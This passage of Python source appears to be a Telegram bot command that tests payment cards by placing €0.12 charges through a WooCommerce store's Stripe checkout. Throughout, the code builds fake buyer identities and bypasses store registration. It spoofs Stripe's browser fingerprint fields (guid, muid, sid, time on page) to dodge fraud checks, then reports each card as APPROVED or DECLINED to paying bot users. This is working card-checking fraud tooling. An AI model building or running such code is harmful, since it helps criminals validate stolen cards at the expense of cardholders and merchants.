        except Exception as e:
            logger.error(f"Shipping setup error: {str(e)}")
            return None, f"Shipping setup error: {str(e)}"

    async def fill_billing_info(self, client, checkout_data, user_info):
        """Fill billing information"""
        try:
            logger.step(7, 8, "Filling billing info...")

            billing_fields = [
                f"billing_first_name={user_info['first_name']}",
                f"billing_last_name={user_info['last_name']}",
                "billing_company=",
                f"billing_country={user_info['country']}",
                f"billing_address_1={user_info['address']}",
                "billing_address_2=",
                f"billing_postcode={user_info['postal_code']}",
                f"billing_city={user_info['city']}",
                f"billing_state={user_info['state']}",
                f"billing_phone={user_info['phone']}",
                f"billing_email={user_info['email']}",
                "shipping_first_name=",
                "shipping_last_name=",
                "shipping_company=",
                f"shipping_country={user_info['country']}",
                f"shipping_address_1={user_info['address']}",
                "shipping_address_2=",
                f"shipping_postcode={user_info['postal_code']}",
                f"shipping_city={user_info['city']}",
                f"shipping_state={user_info['state']}",
                "order_comments=",
                "shipping_method[0]=local_pickup:11",
                "payment_method=eh_stripe_pay",
                f"woocommerce-process-checkout-nonce={checkout_data['checkout_nonce']}",
                "_wp_http_referer=%2Fcheckout%2F"
            ]

            update_data = {
                'wc-ajax': 'update_order_review',
                'security': checkout_data['security_nonce'],
                'post_data': "&".join(billing_fields)
            }

            update_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout/",
            }

            response = await self.make_stealth_request(
                client, 'POST', f"{self.base_url}/?wc-ajax=update_order_review",
                headers=update_headers, data=update_data
            )

            if response.status_code in [200, 202]:
                logger.success("Billing info filled")
                return True, None
            else:
                return False, f"Billing info failed: {response.status_code}"

        except Exception as e:
            return False, f"Billing info error: {str(e)}"

    async def create_stripe_payment_method(self, client, card_details, user_info):
        """Create Stripe payment method"""
        try:
            cc, mes, ano, cvv = card_details

            logger.step(8, 8, "Creating payment method...")

            payment_data = {
                'type': 'card',
                'billing_details[address][line1]': user_info['address'],
                'billing_details[address][country]': user_info['country'],
                'billing_details[address][city]': user_info['city'],
                'billing_details[address][postal_code]': user_info['postal_code'],
                'card[number]': cc.replace(' ', ''),
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano[-2:],
                'guid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'muid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'sid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; split-card-element',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(30000, 90000)),
                'key': self.stripe_key,
                '_stripe_version': '2022-08-01'
            }

            stripe_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            response = await client.post("https://api.stripe.com/v1/payment_methods",
                                         headers=stripe_headers, data=payment_data, timeout=20.0)

            if response.status_code == 200:
                result = response.json()
                payment_method_id = result.get('id')
                if payment_method_id:
                    logger.success(f"Payment method created: {payment_method_id}")
                    return {'success': True, 'payment_method_id': payment_method_id}
                else:
                    return {'success': False, 'error': 'No payment method ID'}
            else:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
                    return {'success': False, 'error': error_msg}
                except:
                    return {'success': False, 'error': 'Stripe API error'}

        except Exception as e:
            return {'success': False, 'error': f"Payment method error: {str(e)}"}

    async def submit_payment(self, client, payment_method_id, user_info, checkout_data):
        """Submit payment - FIXED AMOUNT TO €0.12"""
        try:
            logger.step(9, 8, "Submitting payment...")

            checkout_payload = {
                'wc-ajax': 'checkout',
                'billing_first_name': user_info['first_name'],
                'billing_last_name': user_info['last_name'],
                'billing_company': '',
                'billing_country': user_info['country'],
                'billing_address_1': user_info['address'],
                'billing_address_2': '',
                'billing_postcode': user_info['postal_code'],
                'billing_city': user_info['city'],
                'billing_state': user_info['state'],
                'billing_phone': user_info['phone'],
                'billing_email': user_info['email'],
                'shipping_first_name': '',
                'shipping_last_name': '',
                'shipping_company': '',
                'shipping_country': user_info['country'],
                'shipping_address_1': user_info['address'],
                'shipping_address_2': '',
                'shipping_postcode': user_info['postal_code'],
                'shipping_city': user_info['city'],
                'shipping_state': user_info['state'],
                'order_comments': '',
                'shipping_method[0]': 'local_pickup:11',
                'payment_method': 'eh_stripe_pay',
                'woocommerce-process-checkout-nonce': checkout_data['checkout_nonce'],
                '_wp_http_referer': '/?wc-ajax=update_order_review',
                'eh_stripe_pay_token': payment_method_id,
                'eh_stripe_pay_currency': 'eur',
                'eh_stripe_pay_amount': '0.12',
                'eh_stripe_card_type': 'mastercard'
            }

            checkout_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout/",
            }

            response = await self.make_stealth_request(
                client, 'POST', f"{self.base_url}/?wc-ajax=checkout",
                headers=checkout_headers, data=checkout_payload
            )

            if response.status_code not in [200, 202]:
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': f"Server error: {response.status_code}"
                }

            try:
                result = response.json()
                if result.get('result') == 'success':
                    logger.success("Payment successful")
                    return {
                        'success': True,
                        'status': 'APPROVED',
                        'message': 'Successfully Charged €0.12'
                    }
                else:
                    if 'messages' in result and result['messages']:
                        error_msg = result['messages']
                        error_msg = re.sub(r'<[^>]+>', '', error_msg).strip()

                        if "amount must be at least €0.50 eur" in error_msg.lower():
                            logger.warning("Minimum amount error detected - treating as declined")
                            return {
                                'success': False,
                                'status': 'DECLINED',
                                'message': 'Your card was Declined'
                            }

                        error_msg = self.clean_error_message(error_msg)
                        return {
                            'success': False,
                            'status': 'DECLINED',
                            'message': error_msg
                        }
                    else:
                        return {
                            'success': False,
                            'status': 'DECLINED',
                            'message': 'Payment declined'
                        }

            except json.JSONDecodeError:
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': 'Payment processing error'
                }

        except Exception as e:
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f"Processing error: {str(e)}"
            }

    async def check_card(self, card_details, username, user_data):
        """Main card checking method - FIXED FOR VPS"""
        start_time = time.time()
        logger.info(f"🔍 Starting Stripe Charge €0.12 check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            first_names = ["Kamariya", "Casey", "John", "Michael", "David", "James"]
            last_names = ["Hila de", "Langford", "Smith", "Johnson", "Williams", "Brown"]
            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            email = f"{first_name.lower()}.{last_name.lower().replace(' ', '')}{random.randint(1000,9999)}@gmail.com"
            phone = f"{random.randint(100000000, 999999999)}"

            user_info = {
                'first_name': first_name,
                'last_name': last_name,
                'email': email,
                'phone': phone,
                'city': 'Brussels',
                'state': '',
                'address': '141 8th ave',
                'postal_code': '2000',
                'country': 'BE'
            }

            logger.user(f"User: {first_name} {last_name} | {email} | {phone}")

            # Create client with VPS-specific settings
            client_kwargs = {
                'timeout': 60.0,  # Increased timeout for VPS
                'follow_redirects': True,
                'limits': httpx.Limits(max_keepalive_connections=3, max_connections=6),
            }
            
            # Add SSL context if available
            if self.ssl_context:
                client_kwargs['verify'] = self.ssl_context
            else:
                # Try to use system certs
                try:
                    import certifi
                    client_kwargs['verify'] = certifi.where()
                except:
                    pass
            
            # Try HTTP/2, fallback to HTTP/1.1
            try:
                client_kwargs['http2'] = True
            except:
                logger.warning("HTTP/2 not available, using HTTP/1.1")

            async with httpx.AsyncClient(**client_kwargs) as client:

                # Try session initialization with retries
                max_init_attempts = 4  # Increased attempts
                for attempt in range(max_init_attempts):
                    try:
                        logger.network(f"Session initialization attempt {attempt+1}/{max_init_attempts}")
                        if await self.initialize_session(client):
                            break
                        elif attempt == max_init_attempts - 1:
                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session after multiple attempts", username, time.time()-start_time, user_data, bin_info)
                    except Exception as e:
                        logger.error(f"Session init attempt {attempt+1} failed: {type(e).__name__} - {str(e)[:80]}")
                        if attempt == max_init_attempts - 1:
                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Session initialization error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
                        await asyncio.sleep(3)  # Increased delay

                bypass_success, error = await self.bypass_registration(client, user_info)
                if not bypass_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)

                browse_success, error = await self.browse_shop(client)
                if not browse_success:
                    logger.warning(f"Shop browsing failed but continuing: {error}")

                add_success, error = await self.add_product_to_cart(client)
                if not add_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)

                checkout_data, checkout_error = await self.setup_shipping(client)
                if not checkout_data:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", checkout_error, username, time.time()-start_time, user_data, bin_info)

                billing_success, billing_error = await self.fill_billing_info(client, checkout_data, user_info)
                if not billing_success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", billing_error, username, time.time()-start_time, user_data, bin_info)

                payment_result = await self.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
                if not payment_result['success']:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", payment_result['error'], username, time.time()-start_time, user_data, bin_info)

                result = await self.submit_payment(client, payment_result['payment_method_id'], user_info, checkout_data)

                elapsed_time = time.time() - start_time
                logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']}")

                return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
        except (httpx.ConnectError, socket.gaierror) as e:
            logger.error(f"Connection error: {e}")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
        except ssl.SSLError as e:
            logger.error(f"SSL error: {e}")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "SSL certificate error", username, time.time()-start_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            import traceback
            traceback.print_exc()
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)

# Command handler - CORRECTED WITH UNIVERSAL CHARGE PROCESSOR
@Client.on_message(filters.command(["xx", ".xx", "$xx"]))
@auth_and_free_restricted
async def handle_stripe_charge_012(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "xx")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "xx", 
                    "Stripe Charge €0.12",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE €0.12]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/xx</code> or <code>.xx</code> or <code>$xx</code>
⟐ <b>Usage</b>: <code>/xx cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/xx 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges €0.12 via Stripe gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Stripe Charge €0.12", "xx"
            ) if charge_processor else f"""<b>「$cmd → /xx」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge €0.12
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = StripeCharge012Checker()

        # Process command through universal charge processor - FIXED CALL
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="xx",          # keyword
                gateway_name="Stripe Charge €0.12"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            try:
                result = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result, disable_web_page_preview=True)
            except Exception as e:
                logger.error(f"Card check error: {e}")
                await processing_msg.edit_text(f"""<b>「$cmd → /xx」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge €0.12
<b>[•] Status-</b> ❌ ERROR
<b>[•] Response-</b> <code>VPS Connection Failed: {str(e)[:100]}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>⚠️ Please check VPS network connectivity</b>
<b>⚠️ Ensure SSL certificates are installed</b>
━━━━━━━━━━━━━━━""", disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        logger.error(f"Command handler error: {e}")
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
